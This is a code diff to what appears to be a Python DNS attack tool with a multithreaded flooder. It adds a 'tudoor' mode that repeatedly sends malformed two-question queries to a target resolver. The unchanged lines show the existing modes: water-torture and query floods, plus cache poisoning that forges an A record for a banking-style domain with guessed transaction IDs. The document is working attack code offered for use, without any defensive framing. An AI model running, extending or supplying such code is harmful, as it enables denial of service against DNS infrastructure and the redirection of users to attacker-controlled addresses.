@@ -26,6 +26,13 @@ def flood_worker(duration_sec, mode, stop_event):
         rrset = dns.rrset.from_text("target-banking.example.com.", 300, dns.rdataclass.IN, dns.rdatatype.A, "6.6.6.6")
         base_msg.answer.append(rrset)
         base_wire = bytearray(base_msg.to_wire())
+        
+    elif mode == "tudoor":
+        # Crafting the Malformed Logic Payload (2 Questions)
+        msg = dns.message.make_query("target1.example.com.", dns.rdatatype.A)
+        q2 = dns.message.make_query("target2.example.com.", dns.rdatatype.A).question[0]
+        msg.question.append(q2)
+        tudoor_wire = msg.to_wire()
 
     while time.time() < end_time and not stop_event.is_set():
         if mode == "water_torture":
@@ -40,13 +47,15 @@ def flood_worker(duration_sec, mode, stop_event):
             try: sock.sendto(msg.to_wire(), (TARGET_IP, TARGET_PORT))
             except: pass
         elif mode == "cache_poison":
-            # Fishbowl guessing space
             txid = random.randint(1, 250)
             base_wire[0] = (txid >> 8) & 0xFF
             base_wire[1] = txid & 0xFF
             try: sock.sendto(base_wire, (TARGET_IP, TARGET_PORT))
             except: pass
-            # Crucial yield to prevent OS-level UDP buffer overflow
+            time.sleep(0.0001)
+        elif mode == "tudoor":
+            try: sock.sendto(tudoor_wire, (TARGET_IP, TARGET_PORT))
+            except: pass
             time.sleep(0.0001)
 
     sock.close()
@@ -69,7 +78,7 @@ def start_attack(mode, duration_sec=15, threads_count=8):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument("--mode", choices=["water_torture", "qps_flood", "cache_poison"], required=True)
+    parser.add_argument("--mode", choices=["water_torture", "qps_flood", "cache_poison", "tudoor"], required=True)
     parser.add_argument("--duration", type=int, default=15)
     parser.add_argument("--threads", type=int, default=8)
     args = parser.parse_args()
